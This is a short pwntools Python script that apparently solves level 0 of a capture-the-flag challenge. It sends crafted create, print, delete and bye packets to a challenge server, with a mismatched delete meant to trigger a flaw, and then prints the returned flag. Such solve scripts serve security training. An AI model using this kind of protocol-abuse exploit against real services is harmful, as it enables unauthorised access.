import socket
import proto_util
from pwn import *
LOGLEVEL = 'info'
TIMEOUT = 9999

def start():
    elf = context.binary = ELF('../challenge/server_binary')
    context.log_level = LOGLEVEL
    if args['REMOTE']:
        return remote('trellixhax-free-yo-radicals-part-i.chals.io', 443, ssl=True)
    else:
        return remote('localhost', 9999)

def goto_wait_for_data(p, verb=False):
    msg = p.recvuntil(b'Waiting for data... \n', timeout=TIMEOUT)
    if msg == '':
        log.error('Failed to recv "waiting for data..." message')
        exit(1)
    if verb:
        print('Received data: %s' % msg.decode('utf-8'))

def level00(p):
    goto_wait_for_data(p)

    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=b'AAAABBBBCCCCDDDD', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending print')
    payload = proto_util.proto_packet(action='print', value=0)
    p.send(payload)
    goto_wait_for_data(p, verb=True)
    log.success('Sending delete')
    #payload = proto_util.proto_packet(action='delete', data=b'AAAABBBBCCCCDDDD', value=1337)
    payload = proto_util.proto_packet(action='delete', data=b'WWWWXXXXYYYYZZZZ', value=6666666)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending print')
    payload = proto_util.proto_packet(action='print', value=0)
    p.send(payload)
    goto_wait_for_data(p, verb=True)
    log.success('Sending goodbye')
    payload = proto_util.proto_packet(action='bye')
    p.send(payload)
    flag = p.recvall()
    log.success('Flag is: %s' % flag.split()[0].decode('utf-8'))


if __name__ == '__main__':
    p = start()

    if not p.recvuntil(b'\n') == b'Connected\n':
        log.error('Failed to connect')
    else:
        log.success('Connected')

    level00(p)
